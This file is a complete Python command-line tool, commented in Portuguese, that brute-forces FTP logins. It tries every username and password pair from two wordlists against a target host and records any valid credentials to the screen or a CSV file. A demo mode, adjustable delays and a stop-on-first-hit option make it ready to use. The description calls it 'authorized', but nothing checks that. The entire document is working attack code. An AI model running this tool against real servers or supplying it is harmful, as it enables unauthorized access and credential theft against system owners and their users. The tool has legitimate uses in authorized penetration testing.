#!/usr/bin/env python3
from ftplib import FTP, error_perm, all_errors
import argparse
import time
import sys
import os

def mostrar_demo(target, userlist_path, passlist_path, lines=5):
    """Mostra uma prévia do que será testado (sem logar)."""
    print("="*70)
    print("DEMONSTRAÇÃO (sem tentativas reais)")
    print(f"Target: {target}")
    print(f"Userlist: {userlist_path}")
    print(f"Passlist: {passlist_path}")
    print("-" * 70)

    def preview(path, label):
        print(f"\n{label} - mostrando até {lines} entradas:")
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                for i, l in enumerate(f):
                    if i >= lines: break
                    print(f"  {i+1}: {l.strip()}")
        except FileNotFoundError:
            print(f"  [ERRO] Arquivo {path} não encontrado.")

    preview(userlist_path, "Usuários")
    preview(passlist_path, "Senhas")
    print("="*70)

def tentar_login(target, usuario, senha, port=21, timeout=8):
    """Tenta logar no FTP com ftplib."""
    try:
        ftp = FTP()
        ftp.connect(host=target, port=port, timeout=timeout)
        ftp.login(user=usuario, passwd=senha)
        ftp.quit()
        return True, None
    except error_perm as e:
        return False, str(e)
    except all_errors as e:
        return False, str(e)

def main():
    parser = argparse.ArgumentParser(description="Brute-force FTP autorizado.")
    parser.add_argument('-t', '--target', required=True, help='IP ou host alvo')
    parser.add_argument('-U', '--userlist', required=True, help='Wordlist de usuários')
    parser.add_argument('-P', '--passlist', required=True, help='Wordlist de senhas')
    parser.add_argument('-p', '--port', type=int, default=21, help='Porta do FTP (padrão: 21)')
    parser.add_argument('--timeout', type=float, default=8.0, help='Timeout de conexão (segundos)')
    parser.add_argument('--delay', type=float, default=0.5, help='Delay entre tentativas (segundos)')
    parser.add_argument('--stop-on-find', action='store_true', help='Parar ao encontrar credenciais válidas')
    parser.add_argument('--output', '-o', help='Salvar resultados em arquivo CSV')
    parser.add_argument('--demo', action='store_true', help='Mostrar demonstração e sair')
    args = parser.parse_args()

    if args.demo:
        mostrar_demo(args.target, args.userlist, args.passlist)
        return

    # valida wordlists
    for path in [args.userlist, args.passlist]:
        if not os.path.isfile(path):
            print(f"[ERRO] Arquivo não encontrado: {path}")
            sys.exit(1)

    # lê listas
    with open(args.userlist, 'r', encoding='utf-8', errors='ignore') as f:
        usuarios = [u.strip() for u in f if u.strip()]
    with open(args.passlist, 'r', encoding='utf-8', errors='ignore') as f:
        senhas = [p.strip() for p in f if p.strip()]

    total_tentativas = len(usuarios) * len(senhas)
    print(f"[+] Iniciando brute-force em {args.target}:{args.port}")
    print(f"[+] Total de usuários: {len(usuarios)} | Total de senhas: {len(senhas)}")
    print(f"[+] Total de combinações: {total_tentativas}\n")

    contador = 0
    encontrado = False

    try:
        for user in usuarios:
            for senha in senhas:
                contador += 1
                print(f"[{contador}/{total_tentativas}] Testando {user}:{senha}", end=" ... ", flush=True)
                ok, erro = tentar_login(args.target, user, senha, args.port, args.timeout)

                if ok:
                    print("✅ SUCESSO")
                    encontrado = True
                    linha = f"{args.target},{args.port},{user},{senha}\n"
                    if args.output:
                        with open(args.output, 'a', encoding='utf-8') as fout:
                            fout.write(linha)
                    else:
                        print(f"[RESULTADO] {linha.strip()}")
                    if args.stop_on_find:
                        print("[*] Parando (--stop-on-find habilitado).")
                        raise KeyboardInterrupt  # sai dos loops duplos
                else:
                    if erro and not erro.startswith("530"):
                        print(f"ERRO: {erro}")
                    else:
                        print("inválido")

                time.sleep(args.delay)

    except KeyboardInterrupt:
        print("\n[*] Execução interrompida.")
    except Exception as e:
        print(f"[ERRO] Exceção: {e}")

    if not encontrado:
        print("[*] Nenhuma credencial válida encontrada.")
    else:
        print("[*] Finalizado — pelo menos uma credencial válida encontrada.")

if __name__ == "__main__":
    main()